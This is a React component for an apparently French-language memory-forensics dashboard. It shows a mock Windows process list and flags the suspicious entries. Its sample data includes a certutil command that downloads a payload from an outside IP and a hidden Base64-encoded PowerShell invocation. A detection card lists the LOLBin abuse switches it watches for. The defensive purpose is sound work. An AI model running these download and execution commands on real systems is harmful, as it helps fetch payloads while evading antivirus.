import React, { useState } from 'react';
import { Activity, ShieldAlert, Cpu, Search, AlertCircle, FileSearch, Terminal, Database } from 'lucide-react';
import { ProcessItem } from '../types/cyberdefense';

interface MemoryForensicsPanelProps {
  onRunInConsole: (command: string) => void;
}

export const MemoryForensicsPanel: React.FC<MemoryForensicsPanelProps> = ({ onRunInConsole }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [filterSuspiciousOnly, setFilterSuspiciousOnly] = useState(false);

  // High-fidelity active process tree representation
  const processes: ProcessItem[] = [
    {
      pid: 4,
      name: 'System',
      parentPid: 0,
      cpu: 0.8,
      ramMb: 0.1,
      path: 'N/A (Kernel Memory)',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 612,
      name: 'smss.exe',
      parentPid: 4,
      cpu: 0.0,
      ramMb: 1.2,
      path: 'C:\\Windows\\System32\\smss.exe',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 840,
      name: 'csrss.exe',
      parentPid: 612,
      cpu: 0.2,
      ramMb: 5.4,
      path: 'C:\\Windows\\System32\\csrss.exe',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 1044,
      name: 'wininit.exe',
      parentPid: 612,
      cpu: 0.1,
      ramMb: 4.8,
      path: 'C:\\Windows\\System32\\wininit.exe',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 1280,
      name: 'lsass.exe',
      parentPid: 1044,
      cpu: 0.4,
      ramMb: 24.6,
      path: 'C:\\Windows\\System32\\lsass.exe',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 1492,
      name: 'services.exe',
      parentPid: 1044,
      cpu: 0.3,
      ramMb: 18.2,
      path: 'C:\\Windows\\System32\\services.exe',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 2140,
      name: 'svchost.exe',
      parentPid: 1492,
      cpu: 0.5,
      ramMb: 42.1,
      path: 'C:\\Windows\\System32\\svchost.exe -k DcomLaunch',
      isSuspicious: false,
      integrityLevel: 'SYSTEM',
    },
    {
      pid: 3880,
      name: 'explorer.exe',
      parentPid: 3200,
      cpu: 1.8,
      ramMb: 94.5,
      path: 'C:\\Windows\\explorer.exe',
      isSuspicious: false,
      integrityLevel: 'Medium',
    },
    {
      pid: 5824,
      name: 'svch0st_updater.exe',
      parentPid: 3880,
      cpu: 14.2,
      ramMb: 120.4,
      path: 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe',
      isSuspicious: true,
      anomalyReason: 'Nom mimant svchost.exe lancé depuis %TEMP% par explorer (possible Trojan/Miner Swisyn)',
      integrityLevel: 'High',
    },
    {
      pid: 6112,
      name: 'certutil.exe',
      parentPid: 5824,
      cpu: 2.1,
      ramMb: 15.6,
      path: 'certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
      isSuspicious: true,
      anomalyReason: 'Abus LOLBin certutil pour télécharger un payload distant encodé en contournant le pare-feu',
      integrityLevel: 'High',
    },
    {
      pid: 7340,
      name: 'powershell.exe',
      parentPid: 5824,
      cpu: 4.5,
      ramMb: 68.2,
      path: 'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3...==',
      isSuspicious: true,
      anomalyReason: 'Exécution commande PowerShell encodée en Base64 sans fenêtre visible',
      integrityLevel: 'High',
    },
  ];

  const filteredProcesses = processes.filter(p => {
    const matchSearch = p.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.path.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.pid.toString().includes(searchTerm);
    if (filterSuspiciousOnly) {
      return matchSearch && p.isSuspicious;
    }
    return matchSearch;
  });

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="p-6 bg-slate-900 border border-slate-800 rounded-xl">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs uppercase tracking-wider mb-2">
              <Activity className="w-4 h-4" />
              <span>Inspection Forensique Volatile</span>
            </div>
            <h2 className="text-xl font-bold text-white tracking-tight font-['Plus_Jakarta_Sans']">
              Analyse Mémoire Vive & Détection d'Anomalies Processus
            </h2>
            <p className="mt-1 text-sm text-slate-300">
              Détection des malwares sans fichier (fileless), processus mimétiques, arguments PowerShell encodés et abus de binaires LOLBins.
            </p>
          </div>

          <div className="flex items-center gap-3 shrink-0">
            <button
              onClick={() => onRunInConsole('dump-ram')}
              className="flex items-center gap-2 px-4 py-2 bg-cyan-950 hover:bg-cyan-900 border border-cyan-800 text-cyan-300 font-semibold rounded-lg text-xs transition-colors"
            >
              <Database className="w-3.5 h-3.5" />
              <span>Dump Mémoire d'Urgence</span>
            </button>
            <button
              onClick={() => onRunInConsole('drivers')}
              className="flex items-center gap-2 px-4 py-2 bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-semibold rounded-lg text-xs transition-colors"
            >
              <Cpu className="w-3.5 h-3.5 text-cyan-400" />
              <span>Auditer Pilotes Kernel</span>
            </button>
          </div>
        </div>
      </div>

      {/* Filter and Search Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 bg-slate-900/80 border border-slate-800 rounded-xl">
        <div className="relative flex-1 max-w-md">
          <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={searchTerm}
            onChange={e => setSearchTerm(e.target.value)}
            placeholder="Rechercher par nom, PID, chemin ou argument..."
            className="w-full pl-9 pr-4 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500 font-mono"
          />
        </div>

        <div className="flex items-center gap-3">
          <label className="flex items-center gap-2 text-xs text-slate-300 cursor-pointer select-none">
            <input
              type="checkbox"
              checked={filterSuspiciousOnly}
              onChange={e => setFilterSuspiciousOnly(e.target.checked)}
              className="rounded bg-slate-950 border-slate-700 text-cyan-500 focus:ring-0"
            />
            <span>Afficher uniquement les processus suspects</span>
          </label>
        </div>
      </div>

      {/* Process Table */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg">
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs font-mono">
            <thead className="bg-slate-950/80 text-slate-400 border-b border-slate-800">
              <tr>
                <th className="py-3 px-4 font-semibold">PID / Parent</th>
                <th className="py-3 px-4 font-semibold">Processus</th>
                <th className="py-3 px-4 font-semibold text-right">CPU</th>
                <th className="py-3 px-4 font-semibold text-right">RAM</th>
                <th className="py-3 px-4 font-semibold">Niveau d'Intégrité</th>
                <th className="py-3 px-4 font-semibold">Chemin / Ligne de Commande</th>
                <th className="py-3 px-4 font-semibold text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {filteredProcesses.map(proc => (
                <tr
                  key={proc.pid}
                  className={`transition-colors ${
                    proc.isSuspicious
                      ? 'bg-rose-950/20 hover:bg-rose-950/30'
                      : 'hover:bg-slate-800/40'
                  }`}
                >
                  <td className="py-3 px-4 tabular-nums">
                    <span className="font-bold text-slate-200">{proc.pid}</span>
                    <span className="text-slate-500 text-[11px] ml-1.5">
                      (PPID: {proc.parentPid})
                    </span>
                  </td>
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2">
                      <span className={`font-semibold ${proc.isSuspicious ? 'text-rose-400 font-bold' : 'text-slate-200'}`}>
                        {proc.name}
                      </span>
                      {proc.isSuspicious && (
                        <span className="px-1.5 py-0.5 rounded text-[10px] bg-rose-950 border border-rose-800/60 text-rose-300 font-sans">
                          SUSPECT
                        </span>
                      )}
                    </div>
                    {proc.anomalyReason && (
                      <div className="text-[11px] text-rose-300/90 font-sans mt-0.5 max-w-sm">
                        {proc.anomalyReason}
                      </div>
                    )}
                  </td>
                  <td className="py-3 px-4 text-right tabular-nums text-slate-300">
                    {proc.cpu.toFixed(1)}%
                  </td>
                  <td className="py-3 px-4 text-right tabular-nums text-slate-300">
                    {proc.ramMb.toFixed(1)} MB
                  </td>
                  <td className="py-3 px-4">
                    <span
                      className={`text-[11px] px-2 py-0.5 rounded ${
                        proc.integrityLevel === 'SYSTEM'
                          ? 'bg-purple-950 text-purple-300 border border-purple-800/50'
                          : proc.integrityLevel === 'High'
                          ? 'bg-amber-950 text-amber-300 border border-amber-800/50'
                          : 'bg-slate-800 text-slate-300'
                      }`}
                    >
                      {proc.integrityLevel}
                    </span>
                  </td>
                  <td className="py-3 px-4 max-w-md truncate text-slate-400 text-[11px]">
                    <span title={proc.path}>{proc.path}</span>
                  </td>
                  <td className="py-3 px-4 text-right">
                    {proc.isSuspicious ? (
                      <button
                        onClick={() => onRunInConsole(`kill ${proc.pid}`)}
                        className="px-2.5 py-1 bg-rose-600 hover:bg-rose-500 text-white rounded text-[11px] font-semibold transition-colors"
                      >
                        Tuer (Tree)
                      </button>
                    ) : (
                      <button
                        onClick={() => onRunInConsole(`inspect ${proc.pid}`)}
                        className="px-2 py-1 text-slate-400 hover:text-slate-200 text-[11px] transition-colors"
                      >
                        Détails
                      </button>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* LOLBins & ADS Detection Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="p-6 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
          <h3 className="text-base font-semibold text-slate-100 flex items-center gap-2">
            <ShieldAlert className="w-4 h-4 text-amber-400" />
            LOLBins (Living off the Land Binaries)
          </h3>
          <p className="text-xs text-slate-400 leading-relaxed">
            Les cybercriminels abusent d'outils officiels de Windows pour exécuter des scripts malveillants sans déclencher l'antivirus classique. Notre script surveille les commutateurs critiques :
          </p>
          <ul className="text-xs space-y-1.5 font-mono text-slate-300">
            <li className="flex items-center gap-2">
              <span className="text-rose-400">certutil.exe</span>
              <span className="text-slate-500">→ -urlcache -split -decode</span>
            </li>
            <li className="flex items-center gap-2">
              <span className="text-rose-400">mshta.exe</span>
              <span className="text-slate-500">→ vbscript:Execute / javascript:</span>
            </li>
            <li className="flex items-center gap-2">
              <span className="text-rose-400">regsvr32.exe</span>
              <span className="text-slate-500">→ /s /u /i:http:// scrobj.dll (Squiblydoo)</span>
            </li>
            <li className="flex items-center gap-2">
              <span className="text-rose-400">bitsadmin.exe</span>
              <span className="text-slate-500">→ /transfer de payloads persistants en tâche de fond</span>
            </li>
          </ul>
        </div>

        <div className="p-6 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
          <h3 className="text-base font-semibold text-slate-100 flex items-center gap-2">
            <FileSearch className="w-4 h-4 text-cyan-400" />
            Flux Alternatifs NTFS (Alternate Data Streams)
          </h3>
          <p className="text-xs text-slate-400 leading-relaxed">
            Sur les partitions NTFS, un fichier peut masquer un exécutable complet derrière un autre fichier (ex: <code className="text-cyan-300">facture.pdf:malware.exe</code>) qui reste 100% invisible dans l'Explorateur Windows standard.
          </p>
          <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-xs text-slate-300 space-y-1 font-mono">
            <div>Commande intégrée dans le script v3.0 :</div>
            <code className="text-cyan-300 text-[11px] block">
              Get-Item $path -Stream * | Where-Object {'{'} $_.Stream -ne ':$DATA' {'}'}
            </code>
          </div>
          <button
            onClick={() => onRunInConsole('ads-scan')}
            className="text-xs px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded transition-colors"
          >
            Lancer le scan ADS sur %TEMP% et Bureau
          </button>
        </div>
      </div>
    </div>
  );
};
